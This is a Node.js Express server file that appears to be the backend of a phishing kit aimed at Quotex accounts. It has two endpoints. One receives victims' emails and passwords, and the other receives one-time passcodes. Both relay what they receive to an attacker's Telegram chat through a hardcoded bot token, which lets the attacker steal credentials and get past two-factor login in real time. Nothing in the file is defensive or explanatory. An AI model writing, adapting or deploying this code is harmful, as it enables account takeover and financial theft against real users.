const express = require('express');
const cors = require('cors');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

const BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const ADMIN_CHAT_ID = 7293402395;

// Better way to send to Telegram
async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        if (data.ok) {
            console.log("✅ Message sent to Telegram successfully");
        } else {
            console.log("❌ Telegram API Error:", data.description);
        }
    } catch (error) {
        console.error("❌ Telegram send failed:", error.message);
    }
}

// Login Data
app.post('/api/quotex-login', async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ error: "Missing email or password" });
    }

    const message = `🔴 NEW QUOTEX LOGIN ATTEMPT\n\n` +
                   `📧 Email: ${email}\n` +
                   `🔑 Password: ${password}\n` +
                   `⏰ Time: ${new Date().toLocaleString()}`;

    await sendToTelegram(message);
    res.json({ success: true });
});

// OTP Data
app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp } = req.body;

    const message = `✅ OTP RECEIVED\n\n` +
                   `📧 Email: ${email}\n` +
                   `🔢 OTP: <b>${otp}</b>\n` +
                   `⏰ Time: ${new Date().toLocaleString()}`;

    await sendToTelegram(message);
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`🚀 Server is running on http://localhost:${PORT}`);
});